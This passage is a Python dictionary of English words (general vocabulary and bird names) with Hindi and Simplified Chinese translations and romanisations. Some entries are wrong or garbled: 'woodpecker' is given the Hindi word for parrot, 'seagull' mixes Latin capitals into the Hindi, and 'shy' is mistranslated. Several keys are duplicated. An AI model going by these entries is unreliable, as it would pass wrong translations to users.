            },
            "view": {
                "Hindi": "दृश्य (dṛśya)",
                "Chinese (Simplified)": "视图 (shìtú)"
            },
            "show": {
                "Hindi": "दिखाना (dikhānā)",
                "Chinese (Simplified)": "显示 (xiǎnshì)"
            },
            "hide": {
                "Hindi": "छुपाना (chhupānā)",
                "Chinese (Simplified)": "隐藏 (yǐncáng)"
            },
            "famous": {
                "Hindi": "प्रसिद्ध (prasiddh)",
                "Chinese (Simplified)": "著名 (zhùmíng)"
            },
            "amazing": {
                "Hindi": "शानदार (śāndār)",
                "Chinese (Simplified)": "惊人 (jīngrén)"
            },
            "awesome": {
                "Hindi": "कमाल (kamāl)",
                "Chinese (Simplified)": "太棒了 (tài bàng le)"
            },
            "expand": {
                "Hindi": "फैलाना (phailānā)",
                "Chinese (Simplified)": "扩展 (kuòzhǎn)"
            },
            "shrink": {
                "Hindi": "सिकुड़ना (sikuṛnā)",
                "Chinese (Simplified)": "收缩 (shōusuō)"
            },
            "opposite": {
                "Hindi": "विपरीत (viparīt)",
                "Chinese (Simplified)": "相反 (xiāngfǎn)"
            },
            "buy": {
                "Hindi": "खरीदना (kharīdnā)",
                "Chinese (Simplified)": "买 (mǎi)"
            },
            "sell": {
                "Hindi": "बेचना (bechnā)",
                "Chinese (Simplified)": "卖 (mài)"
            },
            "trade": {
                "Hindi": "वाणिज्य (vāṇijya)",
                "Chinese (Simplified)": "贸易 (màoyì)"
            },
            "travel": {
                "Hindi": "यात्रा (yātrā)",
                "Chinese (Simplified)": "旅行 (lǚxíng)"
            },
            "land": {
                "Hindi": "भूमि (bhūmi)",
                "Chinese (Simplified)": "土地 (tǔdì)"
            },
            "farm": {
                "Hindi": "खेती (khetī)",
                "Chinese (Simplified)": "农场 (nóngchǎng)"
            },
            "crow man": {
                "Hindi": "कौआ आदमी (kauā ādmī)",
                "Chinese (Simplified)": "乌鸦人 (wūyā rén)"
            },
            "year": {
                "Hindi": "वर्ष (varṣ)",
                "Chinese (Simplified)": "年 (nián)"
            },
            "weak": {
                "Hindi": "कमज़ोर (kamzōr)",
                "Chinese (Simplified)": "弱 (ruò)"
            },
            "strong": {
                "Hindi": "मजबूत (majabūt)",
                "Chinese (Simplified)": "强 (qiáng)"
            },
            "powerful": {
                "Hindi": "शक्तिशाली (śaktishālī)",
                "Chinese (Simplified)": "强大 (qiángdà)"
            },
            "month": {
                "Hindi": "महीना (mahinā)",
                "Chinese (Simplified)": "月 (yuè)"
            },
            "week": {
                "Hindi": "सप्ताह (saptāh)",
                "Chinese (Simplified)": "周 (zhōu)"
            },
            "decade": {
                "Hindi": "दशक (daśak)",
                "Chinese (Simplified)": "十年 (shí nián)"
            },
            "century": {
                "Hindi": "सदी (sadī)",
                "Chinese (Simplified)": "世纪 (shìjì)"
            },
            # Bird names
            "crow": {
                "Hindi": "कौआ (kauā)",
                "Chinese (Simplified)": "乌鸦 (wūyā)"
            },
            "parrot": {
                "Hindi": "तोता (totā)",
                "Chinese (Simplified)": "鹦鹉 (yīngwǔ)"
            },
            "eagle": {
                "Hindi": "गरुड़ (garuḍ)",
                "Chinese (Simplified)": "鹰 (yīng)"
            },
            "sparrow": {
                "Hindi": "गौरैया (gauraiyā)",
                "Chinese (Simplified)": "麻雀 (máquè)"
            },
            "pigeon": {
                "Hindi": "कबूतर (kabūtar)",
                "Chinese (Simplified)": "鸽子 (gēzi)"
            },
            "owl": {
                "Hindi": "उल्लू (ullū)",
                "Chinese (Simplified)": "猫头鹰 (māo tóu yīng)"
            },
            "peacock": {
                "Hindi": "मोर (mor)",
                "Chinese (Simplified)": "孔雀 (kǒngquè)"
            },
            "duck": {
                "Hindi": "बतख (batakh)",
                "Chinese (Simplified)": "鸭子 (yāzi)"
            },
            "flamingo": {
                "Hindi": "फ्लेमिंगो (phlemīngō)",
                "Chinese (Simplified)": "火烈鸟 (huǒ liè niǎo)"
            },
            "hawk": {
                "Hindi": "बाज़ (bāz)",
                "Chinese (Simplified)": "猎鹰 (liè yīng)"
            },
            "eagle": {
                "Hindi": "गरुड़ (garuḍ)",
                "Chinese (Simplified)": "鹰 (yīng)"
            },
            "vulture": {
                "Hindi": "गिद्ध (giddh)",
                "Chinese (Simplified)": "秃鹰 (tū yīng)"
            },
            "woodpecker": {
                "Hindi": "तोता (totā)",
                "Chinese (Simplified)": "啄木鸟 (zhuó mù niǎo)"
            },
            "seagull": {
                "Hindi": "समुद्री गULL (samudrī gull)",
                "Chinese (Simplified)": "海鸥 (hǎi'ōu)"
            },
            "swallow": {
                "Hindi": "स्वालो (swālō)",
                "Chinese (Simplified)": "燕子 (yànzi)"
            },
            "peacock": {
                "Hindi": "मोर (mor)",
                "Chinese (Simplified)": "孔雀 (kǒngquè)"
            },
            "robin": {
                "Hindi": "रोबिन (robin)",
                "Chinese (Simplified)": "知更鸟 (zhī gèng niǎo)"
            },
            "flamingo": {
                "Hindi": "फ्लेमिंगो (phlemīngō)",
                "Chinese (Simplified)": "火烈鸟 (huǒ liè niǎo)"
            },
            "pigeon": {
                "Hindi": "कबूतर (kabūtar)",
                "Chinese (Simplified)": "鸽子 (gēzi)"
            },
            "cockatoo": {
                "Hindi": "कॉकाटू (cockatoo)",
                "Chinese (Simplified)": "凤头鹦鹉 (fèng tóu yīngwǔ)"
            },
            "exam": {
                "Hindi": "परीक्षा (parīkṣā)",
                "Chinese (Simplified)": "考试 (kǎoshì)"
            },
            "result": {
                "Hindi": "परिणाम (pariṇām)",
                "Chinese (Simplified)": "结果 (jiéguǒ)"
            },
            "pass": {
                "Hindi": "उत्तीर्ण (uttīrṇ)",
                "Chinese (Simplified)": "通过 (tōngguò)"
            },
            "fail": {
                "Hindi": "असफल (asafal)",
                "Chinese (Simplified)": "失败 (shībài)"
            },
            "failure": {
                "Hindi": "विफलता (viphalatā)",
                "Chinese (Simplified)": "失败 (shībài)"
            },
            "like": {
                "Hindi": "पसंद (pasand)",
                "Chinese (Simplified)": "喜欢 (xǐhuān)"
            },
            "dislike": {
                "Hindi": "नापसंद (nāpasand)",
                "Chinese (Simplified)": "不喜欢 (bù xǐhuān)"
            },
            "fine": {
                "Hindi": "ठीक (ṭhīk)",
                "Chinese (Simplified)": "好 (hǎo)"
            },
            "more": {
                "Hindi": "अधिक (adhik)",
                "Chinese (Simplified)": "更多 (gèng duō)"
            },
            "less": {
                "Hindi": "कम (kam)",
                "Chinese (Simplified)": "更少 (gèng shǎo)"
            },
            "change": {
                "Hindi": "परिवर्तन (parivartan)",
                "Chinese (Simplified)": "改变 (gǎibiàn)"
            },
            "know": {
                "Hindi": "जानना (jānānā)",
                "Chinese (Simplified)": "知道 (zhīdào)"
            },
            "alive": {
                "Hindi": "जीवित (jīvit)",
                "Chinese (Simplified)": "活着 (huózhe)"
            },
            "dead": {
                "Hindi": "मृत (mṛt)",
                "Chinese (Simplified)": "死 (sǐ)"
            },
            "use": {
                "Hindi": "उपयोग (upayog)",
                "Chinese (Simplified)": "使用 (shǐyòng)"
            },
            "with": {
                "Hindi": "साथ (sāth)",
                "Chinese (Simplified)": "与 (yǔ)"
            },
            "of": {
                "Hindi": "का (kā)",
                "Chinese (Simplified)": "的 (de)"
            },
            "off": {
                "Hindi": "बंद (band)",
                "Chinese (Simplified)": "关 (guān)"
            },
            "much": {
                "Hindi": "काफ़ी (kāfī)",
                "Chinese (Simplified)": "多 (duō)"
            },
            "done": {
                "Hindi": "पूरा (pūrā)",
                "Chinese (Simplified)": "完成 (wánchéng)"
            },
            "yet": {
                "Hindi": "अभी तक (abhī tak)",
                "Chinese (Simplified)": "还 (hái)"
            },
            "not": {
                "Hindi": "नहीं (nahīṁ)",
                "Chinese (Simplified)": "不 (bù)"
            },
            "increase": {
                "Hindi": "बढ़ाना (baṛhānā)",
                "Chinese (Simplified)": "增加 (zēngjiā)"
            },
            "decrease": {
                "Hindi": "घटाना (ghaṭānā)",
                "Chinese (Simplified)": "减少 (jiǎnshǎo)"
            },
            "curve": {
                "Hindi": "वक्र (vakra)",
                "Chinese (Simplified)": "曲线 (qūxiàn)"
            },
            "come": {
                "Hindi": "आना (ānā)",
                "Chinese (Simplified)": "来 (lái)"
            },
            "out": {
                "Hindi": "बाहर (bāhar)",
                "Chinese (Simplified)": "出去 (chūqù)"
            },
            "chest": {
                "Hindi": "छाती (chātī)",
                "Chinese (Simplified)": "胸部 (xiōngbù)"
            },
            "muscle": {
                "Hindi": "पेशी (peśī)",
                "Chinese (Simplified)": "肌肉 (jīròu)"
            },
            "image": {
                "Hindi": "चित्र (citra)",
                "Chinese (Simplified)": "图像 (túxiàng)"
            },
            "street": {
                "Hindi": "सड़क (saṛak)",
                "Chinese (Simplified)": "街道 (jiēdào)"
            },
            "candle": {
                "Hindi": "मोमबत्ती (mombaṭṭī)",
                "Chinese (Simplified)": "蜡烛 (làzhú)"
            },
            "put": {
                "Hindi": "रखना (rakhānā)",
                "Chinese (Simplified)": "放 (fàng)"
            },
            "pull": {
                "Hindi": "खींचना (khīnchnā)",
                "Chinese (Simplified)": "拉 (lā)"
            },
            "height": {
                "Hindi": "ऊंचाई (ūnchāī)",
                "Chinese (Simplified)": "高度 (gāodù)"
            },
            "information": {
                "Hindi": "जानकारी (jānkārī)",
                "Chinese (Simplified)": "信息 (xìnxī)"
            },
            "mistake": {
                "Hindi": "गलती (galatī)",
                "Chinese (Simplified)": "错误 (cuòwù)"
            },
            "just": {
                "Hindi": "सिर्फ (sirf)",
                "Chinese (Simplified)": "只是 (zhǐshì)"
            },
            "and": {
                "Hindi": "और (aur)",
                "Chinese (Simplified)": "和 (hé)"
            },
            "hat": {
                "Hindi": "टोपी (ṭopī)",
                "Chinese (Simplified)": "帽子 (màozi)"
            },
            "or": {
                "Hindi": "या (yā)",
                "Chinese (Simplified)": "或 (huò)"
            },
            "some": {
                "Hindi": "कुछ (kuch)",
                "Chinese (Simplified)": "一些 (yīxiē)"
            },
            "thing": {
                "Hindi": "चीज (chīz)",
                "Chinese (Simplified)": "东西 (dōngxī)"
            },
            "object": {
                "Hindi": "वस्तु (vastu)",
                "Chinese (Simplified)": "物体 (wùtǐ)"
            },
            "piece": {
                "Hindi": "टुकड़ा (ṭukṛā)",
                "Chinese (Simplified)": "块 (kuài)"
            },
            "simple": {
                "Hindi": "सादा (sādā)",
                "Chinese (Simplified)": "简单 (jiǎndān)"
            },
            "difficult": {
                "Hindi": "कठिन (kaṭhin)",
                "Chinese (Simplified)": "困难 (kùnnán)"
            },
            "easy": {
                "Hindi": "आसान (āsān)",
                "Chinese (Simplified)": "容易 (róngyì)"
            },
            "normal": {
                "Hindi": "सामान्य (sāmānya)",
                "Chinese (Simplified)": "正常 (zhèngcháng)"
            },
            "heaven": {
                "Hindi": "स्वर्ग (svarg)",
                "Chinese (Simplified)": "天堂 (tiāntáng)"
            },
            "hell": {
                "Hindi": "नरक (narak)",
                "Chinese (Simplified)": "地狱 (dìyù)"
            },
            "privilege": {
                "Hindi": "विशेषाधिकार (viśeṣādhikār)",
                "Chinese (Simplified)": "特权 (tèquán)"
            },
            "secret": {
                "Hindi": "रहस्य (rahasya)",
                "Chinese (Simplified)": "秘密 (mìmì)"
            },
            "expose": {
                "Hindi": "उघाड़ना (ughāṛnā)",
                "Chinese (Simplified)": "揭露 (jiēlù)"
            },
            "talent": {
                "Hindi": "प्रतिभा (pratibhā)",
                "Chinese (Simplified)": "天赋 (tiānfù)"
            },
            "inspire": {
                "Hindi": "प्रेरित करना (prērit karnā)",
                "Chinese (Simplified)": "激励 (jīlì)"
            },
            "aspire": {
                "Hindi": "आकांक्षा रखना (ākāṅkṣā rakhnā)",
                "Chinese (Simplified)": "渴望 (kěwàng)"
            },
            "poor": {
                "Hindi": "गरीब (garīb)",
                "Chinese (Simplified)": "贫穷 (pínqióng)"
            },
            "rich": {
                "Hindi": "अमीर (amīr)",
                "Chinese (Simplified)": "富有 (fùyǒu)"
            },
            "middle": {
                "Hindi": "मध्य (madhya)",
                "Chinese (Simplified)": "中间 (zhōngjiān)"
            },
            "medium": {
                "Hindi": "मध्यम (madhyam)",
                "Chinese (Simplified)": "中等 (zhōngděng)"
            },
            "sword": {
                "Hindi": "तलवार (talvār)",
                "Chinese (Simplified)": "剑 (jiàn)"
            },
            "shield": {
                "Hindi": "ढाल (ḍhāl)",
                "Chinese (Simplified)": "盾牌 (dùn pái)"
            },
            "attack": {
                "Hindi": "हमला (hamlā)",
                "Chinese (Simplified)": "攻击 (gōngjí)"
            },
            "watch": {
                "Hindi": "घड़ी (ghaṛī)",
                "Chinese (Simplified)": "手表 (shǒubiǎo)"
            },
            "super": {
                "Hindi": "सुपर (supar)",
                "Chinese (Simplified)": "超级 (chāojí)"
            },
            "crazy": {
                "Hindi": "पागल (pāgal)",
                "Chinese (Simplified)": "疯狂 (fēngkuáng)"
            },
            "college": {
                "Hindi": "कॉलेज (kōlej)",
                "Chinese (Simplified)": "大学 (dàxué)"
            },
            "education": {
                "Hindi": "शिक्षा (śikṣā)",
                "Chinese (Simplified)": "教育 (jiàoyù)"
            },
            "stress": {
                "Hindi": "तनाव (tanāv)",
                "Chinese (Simplified)": "压力 (yālì)"
            },
            "waste": {
                "Hindi": "अपशिष्ट (apśiṣṭ)",
                "Chinese (Simplified)": "浪费 (làngfèi)"
            },
            "improve": {
                "Hindi": "सुधारना (sudhārnā)",
                "Chinese (Simplified)": "改善 (gǎishàn)"
            },
            "palm": {
                "Hindi": "हाथ की हथेली (hāth kī hathelī)",
                "Chinese (Simplified)": "手掌 (shǒuzhǎng)"
            },
            "eye": {
                "Hindi": "आंख (āṅkh)",
                "Chinese (Simplified)": "眼睛 (yǎnjīng)"
            },
            "lick": {
                "Hindi": "चाटना (chāṭnā)",
                "Chinese (Simplified)": "舔 (tiǎn)"
            },
            "luck": {
                "Hindi": "भाग्य (bhāgya)",
                "Chinese (Simplified)": "运气 (yùnqì)"
            },
            "copy": {
                "Hindi": "नकल (nakal)",
                "Chinese (Simplified)": "复制 (fùzhì)"
            },
            "title": {
                "Hindi": "शीर्षक (śīrṣak)",
                "Chinese (Simplified)": "标题 (biāotí)"
            },
            "clean": {
                "Hindi": "साफ (sāf)",
                "Chinese (Simplified)": "干净 (gānjìng)"
            },
            "soft": {
                "Hindi": "मुलायम (mulāyam)",
                "Chinese (Simplified)": "软 (ruǎn)"
            },
            "wet": {
                "Hindi": "गीला (gīlā)",
                "Chinese (Simplified)": "湿 (shī)"
            },
            "dirt": {
                "Hindi": "मिट्टी (miṭṭī)",
                "Chinese (Simplified)": "泥土 (nítǔ)"
            },
            "plant": {
                "Hindi": "पौधा (paudhā)",
                "Chinese (Simplified)": "植物 (zhíwù)"
            },
            "dry": {
                "Hindi": "सूखा (sūkhā)",
                "Chinese (Simplified)": "干 (gān)"
            },
            "make": {
                "Hindi": "बनाना (banānā)",
                "Chinese (Simplified)": "做 (zuò)"
            },
            "action": {
                "Hindi": "क्रिया (kriyā)",
                "Chinese (Simplified)": "行动 (xíngdòng)"
            },
            "idea": {
                "Hindi": "विचार (vicār)",
                "Chinese (Simplified)": "主意 (zhǔyì)"
            },
            "choose": {
                "Hindi": "चुनना (chunnā)",
                "Chinese (Simplified)": "选择 (xuǎnzé)"
            },
            "best": {
                "Hindi": "सर्वश्रेष्ठ (sarvasreṣṭh)",
                "Chinese (Simplified)": "最好 (zuì hǎo)"
            },
            "shake": {
                "Hindi": "हिलाना (hilānā)",
                "Chinese (Simplified)": "摇动 (yáodòng)"
            },
            "shock": {
                "Hindi": "आघात (āghāt)",
                "Chinese (Simplified)": "震惊 (zhènjīng)"
            },
            "shy": {
                "Hindi": "लिजलिजा (lijalijā)",
                "Chinese (Simplified)": "害羞 (hàixiū)"
            },
            "stupid": {
                "Hindi": "मूर्ख (mūrkh)",
                "Chinese (Simplified)": "愚蠢 (yúchǔn)"
            },
            "meat": {
                "Hindi": "मांस (māns)",
                "Chinese (Simplified)": "肉 (ròu)"
            },
            "meet": {
                "Hindi": "मिलना (milnā)",
                "Chinese (Simplified)": "见面 (jiànmiàn)"
            },
            "together": {
                "Hindi": "साथ (sāth)",
                "Chinese (Simplified)": "一起 (yīqǐ)"
            },
            "butt": {
                "Hindi": "नितंब (nitamb)",
                "Chinese (Simplified)": "屁股 (pìgu)"
            },
            "humanity": {
                "Hindi": "मानवता (mānavtā)",
                "Chinese (Simplified)": "人类 (rénlèi)"
            },
            "group": {
                "Hindi": "समूह (samūh)",
                "Chinese (Simplified)": "群体 (qúntǐ)"
            },
            "community": {
                "Hindi": "समुदाय (samudāy)",
                "Chinese (Simplified)": "社区 (shèqū)"
            },
            "society": {
                "Hindi": "समाज (samāj)",
                "Chinese (Simplified)": "社会 (shèhuì)"
            },
            "town": {
                "Hindi": "कस्बा (kasbā)",
                "Chinese (Simplified)": "镇 (zhèn)"
            },
            "entry": {
                "Hindi": "प्रवेश (praveś)",
                "Chinese (Simplified)": "入口 (rùkǒu)"
            },
            "thigh": {
                "Hindi": "जांघ (jāṅgh)",
                "Chinese (Simplified)": "大腿 (dàtuǐ)"
            },
            "hand": {
                "Hindi": "हाथ (hāth)",
                "Chinese (Simplified)": "手 (shǒu)"
            },
            "foot": {
                "Hindi": "पैर (pēr)",
                "Chinese (Simplified)": "脚 (jiǎo)"
            },
            "bucket": {
                "Hindi": "बाल्टी (bālṭī)",
                "Chinese (Simplified)": "桶 (tǒng)"
            },
            "play": {
                "Hindi": "खेलना (khelnā)",
                "Chinese (Simplified)": "玩 (wán)"
            },
            "draw": {
                "Hindi": "खींचना (khīnchnā)",
                "Chinese (Simplified)": "画 (huà)"
            },
            "trick": {
                "Hindi": "चाल (chāl)",
                "Chinese (Simplified)": "把戏 (bǎxì)"
            },
            "trigger": {
                "Hindi": "ट्रिगर (ṭrigar)",
                "Chinese (Simplified)": "触发 (chùfā)"
            },
            "special": {
                "Hindi": "विशेष (viśeṣ)",
                "Chinese (Simplified)": "特别 (tèbié)"
            },
            "interact": {
                "Hindi": "परस्पर क्रिया करना (paraspar kriyā karnā)",
                "Chinese (Simplified)": "互动 (hùdòng)"
            },
            "count": {
                "Hindi": "गिनती (gintī)",
                "Chinese (Simplified)": "计数 (jìshù)"
            },
            "agree": {
                "Hindi": "सहमत होना (sahamat honā)",
                "Chinese (Simplified)": "同意 (tóngyì)"
            },
            "disagree": {
                "Hindi": "असहमत होना (asahamat honā)",
                "Chinese (Simplified)": "不同意 (bùtóngyì)"
            },
            "naked": {
                "Hindi": "नग्न (nagna)",
                "Chinese (Simplified)": "裸体 (luǒtǐ)"
            },
            "business": {
                "Hindi": "व्यवसाय (vyavasāy)",
                "Chinese (Simplified)": "生意 (shēngyì)"
            },
            "hardworking": {
                "Hindi": "मेहनती (mehanatī)",
                "Chinese (Simplified)": "勤奋 (qínfèn)"
            },
            "gone": {
                "Hindi": "चला गया (calā gayā)",
                "Chinese (Simplified)": "走了 (zǒule)"
            },
            "person": {
                "Hindi": "व्यक्ति (vyakti)",
                "Chinese (Simplified)": "人 (rén)"
            },
            "people": {
                "Hindi": "लोग (log)",
                "Chinese (Simplified)": "人们 (rénmen)"
            },
            "transgender": {
                "Hindi": "ट्रांसजेंडर (ṭrānsjeṇḍar)",
                "Chinese (Simplified)": "变性人 (biànxìng rén)"
            },
            "lose": {
                "Hindi": "खोना (khonā)",
                "Chinese (Simplified)": "失去 (shīqù)"
            },
            "news": {
                "Hindi": "समाचार (samācār)",
                "Chinese (Simplified)": "新闻 (xīnwén)"
            },
            "mini": {
                "Hindi": "छोटा (choṭā)",
                "Chinese (Simplified)": "迷你 (mínǐ)"
            },
            "hour": {
                "Hindi": "घंटा (ghaṇṭā)",
                "Chinese (Simplified)": "小时 (xiǎoshí)"
            },
            "seconds": {
                "Hindi": "सेकंड (sekaṇḍ)",
                "Chinese (Simplified)": "秒 (miǎo)"
            },
            "days": {
                "Hindi": "दिन (din)",
                "Chinese (Simplified)": "天 (tiān)"
            },
            "mock": {
                "Hindi": "मज़ाक उड़ाना (mazāk uḍānā)",
                "Chinese (Simplified)": "嘲笑 (cháoxiào)"
            },
            "pleasure": {
                "Hindi": "सुख (sukh)",
                "Chinese (Simplified)": "快乐 (kuàilè)"
            },
            "pain": {
                "Hindi": "दर्द (dard)",
                "Chinese (Simplified)": "痛苦 (tòngkǔ)"
            },
            "tiredness": {
                "Hindi": "थकावट (thakāvaṭ)",
                "Chinese (Simplified)": "疲劳 (píláo)"
            },
            "tired": {
                "Hindi": "थका हुआ (thakā huā)",
                "Chinese (Simplified)": "累 (lèi)"
            },
            "depressed": {
                "Hindi": "उदास (udās)",
                "Chinese (Simplified)": "沮丧 (jǔsàng)"
            },
            "fun": {
                "Hindi": "मज़ा (mazā)",
                "Chinese (Simplified)": "乐趣 (lèqù)"
            },
            "just": {
                "Hindi": "बस (bas)",
                "Chinese (Simplified)": "刚刚 (gānggāng)"
            },
            "who": {
                "Hindi": "कौन (kaun)",
                "Chinese (Simplified)": "谁 (shéi)"
            },
            "here": {
                "Hindi": "यहाँ (yahān)",
                "Chinese (Simplified)": "这里 (zhèlǐ)"
            },
            "curse": {
                "Hindi": "शाप (śāp)",
                "Chinese (Simplified)": "诅咒 (zǔzhòu)"
            },
            "add": {
                "Hindi": "जोड़ना (joṛnā)",
                "Chinese (Simplified)": "添加 (tiānjiā)"
            },
            "divide": {
                "Hindi": "विभाजित करना (vibhājit karnā)",
                "Chinese (Simplified)": "划分 (huàfēn)"
            },
            "multiply": {
                "Hindi": "गुणा करना (guṇā karnā)",
                "Chinese (Simplified)": "乘以 (chéngyǐ)"
            },
            "minus": {
                "Hindi": "घटाना (ghaṭānā)",
                "Chinese (Simplified)": "减 (jiǎn)"
            },
            "loop": {
                "Hindi": "घेरा (gherā)",
                "Chinese (Simplified)": "循环 (xúnhuán)"
            },
            "great": {
                "Hindi": "महान (mahān)",
                "Chinese (Simplified)": "伟大 (wěidà)"
            },
            "history": {
                "Hindi": "इतिहास (itihās)",
                "Chinese (Simplified)": "历史 (lìshǐ)"
            },
            "popular": {
                "Hindi": "लोकप्रिय (lokpriya)",
                "Chinese (Simplified)": "受欢迎 (shòu huānyíng)"
            },
            "stick": {
                "Hindi": "छड़ी (chaṛī)",
                "Chinese (Simplified)": "棍 (gùn)"
            },
            "spot": {
                "Hindi": "स्थान (sthān)",
                "Chinese (Simplified)": "地点 (dìdiǎn)"
            },
            "enter": {
                "Hindi": "प्रवेश करना (praveś karnā)",
                "Chinese (Simplified)": "进入 (jìnrù)"
            },
            "service": {
                "Hindi": "सेवा (sevā)",
                "Chinese (Simplified)": "服务 (fúwù)"
            },
            "if": {
                "Hindi": "यदि (yadi)",
                "Chinese (Simplified)": "如果 (rúguǒ)"
            },
            "top": {
                "Hindi": "शीर्ष (śīrṣ)",
                "Chinese (Simplified)": "顶部 (dǐngbù)"
            },
            "clear": {
                "Hindi": "साफ़ (sāf)",
                "Chinese (Simplified)": "清楚 (qīngchǔ)"
            },
            "have": {
                "Hindi": "है (hai)",
                "Chinese (Simplified)": "有 (yǒu)"
            },
            "word": {
                "Hindi": "शब्द (śabd)",
                "Chinese (Simplified)": "单词 (dāncí)"
            },
            "request": {
                "Hindi": "अनुरोध (anurodh)",
                "Chinese (Simplified)": "请求 (qǐngqiú)"
            },
            "need": {
                "Hindi": "आवश्यकता (āvaśyaktā)",
                "Chinese (Simplified)": "需要 (xūyào)"
            },
            "want": {
                "Hindi": "चाहना (cāhnā)",
                "Chinese (Simplified)": "想要 (xiǎngyào)"
            },
            "recent": {
                "Hindi": "हाल का (hāl kā)",
                "Chinese (Simplified)": "最近 (zuìjìn)"
            },
            "difference": {
                "Hindi": "अंतर (antar)",
                "Chinese (Simplified)": "差异 (chāyì)"
            },
            "different": {
                "Hindi": "भिन्न (bhinn)",
                "Chinese (Simplified)": "不同 (bùtóng)"
            },
            "why": {
                "Hindi": "क्यों (kyon)",
                "Chinese (Simplified)": "为什么 (wèishéme)"
            },
            "what": {
                "Hindi": "क्या (kyā)",
                "Chinese (Simplified)": "什么 (shénme)"
            },
            "learn": {
                "Hindi": "सीखना (sīkhnā)",
                "Chinese (Simplified)": "学习 (xuéxí)"
            },
            "learning": {
                "Hindi": "सीखने (sīkhnē)",
                "Chinese (Simplified)": "学习中 (xuéxí zhōng)"
            },
            "sick": {
                "Hindi": "बीमार (bīmār)",
                "Chinese (Simplified)": "生病 (shēngbìng)"
            },
            "oil": {
                "Hindi": "तेल (tel)",
                "Chinese (Simplified)": "油 (yóu)"
            },
            "gas": {
                "Hindi": "गैस (gais)",
                "Chinese (Simplified)": "气体 (qìtǐ)"
            },
            "evolution": {
                "Hindi": "विकास (vikās)",
                "Chinese (Simplified)": "进化 (jìnhuà)"
            },
            "revolution": {
                "Hindi": "क्रांति (krānti)",
                "Chinese (Simplified)": "革命 (gémìng)"
            },
            "mathematics": {
                "Hindi": "गणित (Gaṇit)",
                "Chinese (Simplified)": "数学 (shùxué)"
            },
            "science": {
                "Hindi": "विज्ञान (Vijñān)",
                "Chinese (Simplified)": "科学 (kēxué)"
            },
            "physics": {
                "Hindi": "भौतिकी (Bhautikī)",
                "Chinese (Simplified)": "物理 (wùlǐ)"
            },
            "chemistry": {
                "Hindi": "रसायन विज्ञान (Rasāyan Vijñān)",
                "Chinese (Simplified)": "化学 (huàxué)"
            },
            "biology": {
                "Hindi": "जीवविज्ञान (Jīvavijñān)",
                "Chinese (Simplified)": "生物学 (shēngwùxué)"
            },
            "frequency": {
                "Hindi": "आवृत्ति (āvr̥tti)",
                "Chinese (Simplified)": "频率 (pínlǜ)"
            },
            "context": {
                "Hindi": "संदर्भ (sandarbh)",
                "Chinese (Simplified)": "上下文 (shàngxiàwén)"
            },
            "example": {
                "Hindi": "उदाहरण (udāharan)",
                "Chinese (Simplified)": "例子 (lìzi)"
            },
            "provide": {
                "Hindi": "प्रदान करना (pradān karnā)",
                "Chinese (Simplified)": "提供 (tígōng)"
            },
            "translate": {
                "Hindi": "अनुवाद करना (anuvād karnā)",
                "Chinese (Simplified)": "翻译 (fānyì)"
            },
            "account": {
                "Hindi": "खाता (khātā)",
                "Chinese (Simplified)": "账户 (zhànghù)"
            },
            "device": {
                "Hindi": "उपकरण (upakarṇa)",
                "Chinese (Simplified)": "设备 (shèbèi)"
            },
            "machine": {
                "Hindi": "यंत्र (yantr)",
                "Chinese (Simplified)": "机器 (jīqì)"
            },
            "single": {
                "Hindi": "अकेला (akelā)",
                "Chinese (Simplified)": "单一的 (dānyī de)"
            },
            "double": {
                "Hindi": "दोगुना (dogunā)",
                "Chinese (Simplified)": "双重的 (shuāngchóng de)"
            },
            "triple": {
                "Hindi": "तिगुना (tigunā)",
                "Chinese (Simplified)": "三重的 (sānchóng de)"
            },
            "manager": {
                "Hindi": "प्रबंधक (prabhandhak)",
                "Chinese (Simplified)": "经理 (jīnglǐ)"
            },
            "partner": {
                "Hindi": "साझेदार (sāhejēdār)",
                "Chinese (Simplified)": "伙伴 (huǒbàn)"
            },
            "couple": {
                "Hindi": "युगल (yugal)",
                "Chinese (Simplified)": "夫妇 (fūfù)"
            },
            "activity": {
                "Hindi": "गतिविधि (gatividhi)",
                "Chinese (Simplified)": "活动 (huó dòng)"
            },
            "kill": {
                "Hindi": "मारना (mārnā)",
                "Chinese (Simplified)": "杀死 (shā sǐ)"
            },
            "burn": {
                "Hindi": "जलाना (jalānā)",
                "Chinese (Simplified)": "燃烧 (ránshāo)"
            },
            "born": {
                "Hindi": "जन्म लेना (janm lena)",
                "Chinese (Simplified)": "出生 (chūshēng)"
            },
            "citizen": {
                "Hindi": "नागरिक (nāgarik)",
                "Chinese (Simplified)": "公民 (gōngmín)"
            },
            "voice": {
                "Hindi": "आवाज़ (āvāz)",
                "Chinese (Simplified)": "声音 (shēngyīn)"
            },
            "plane": {
                "Hindi": "विमान (vimān)",
                "Chinese (Simplified)": "飞机 (fēijī)"
            },
            "basic": {
                "Hindi": "मूलभूत (mūlabhūt)",
                "Chinese (Simplified)": "基本的 (jīběn de)"
            },
            "advanced": {
                "Hindi": "उन्नत (unnata)",
                "Chinese (Simplified)": "高级的 (gāojí de)"
            },
            "base": {
                "Hindi": "आधार (ādhār)",
                "Chinese (Simplified)": "基础 (jīchǔ)"
            },
            "location": {
                "Hindi": "स्थान (sthān)",
                "Chinese (Simplified)": "位置 (wèizhì)"
            },
            "giant": {
                "Hindi": "विशालकाय (viśālkāya)",
                "Chinese (Simplified)": "巨大的 (jùdà de)"
            },
            "send": {
                "Hindi": "भेजना (bhejnā)",
                "Chinese (Simplified)": "发送 (fāsòng)"
            },
            "letter": {
                "Hindi": "पत्र (patra)",
                "Chinese (Simplified)": "信 (xìn)"
            },
            "grill": {
                "Hindi": "ग्रिल (gril)",
                "Chinese (Simplified)": "烤架 (kǎojià)"
            },
            "balcony": {
                "Hindi": "बालकनी (bālknī)",
                "Chinese (Simplified)": "阳台 (yángtái)"
            },
            "toilet": {
                "Hindi": "शौचालय (śaucalaya)",
                "Chinese (Simplified)": "厕所 (cèsuǒ)"
            },
            "stairs": {
                "Hindi": "सीढ़ियाँ (sīṛhiyāṅ)",
                "Chinese (Simplified)": "楼梯 (lóutī)"
            },
            "protein": {
                "Hindi": "प्रोटीन (protīn)",
                "Chinese (Simplified)": "蛋白质 (dànbái zhì)"
            },
            "nutrients": {
                "Hindi": "पोषक तत्व (poṣak tatva)",
                "Chinese (Simplified)": "营养素 (yíngyǎng sù)"
            },
            "fat": {
                "Hindi": "वसा (vasā)",
                "Chinese (Simplified)": "脂肪 (zhīfáng)"
            },
            "skinny": {
                "Hindi": "दुबला-पतला (dublā-patlā)",
                "Chinese (Simplified)": "瘦的 (shòu de)"
            },
            "skin": {
                "Hindi": "त्वचा (tvacā)",
                "Chinese (Simplified)": "皮肤 (pífū)"
            },
            "cut": {
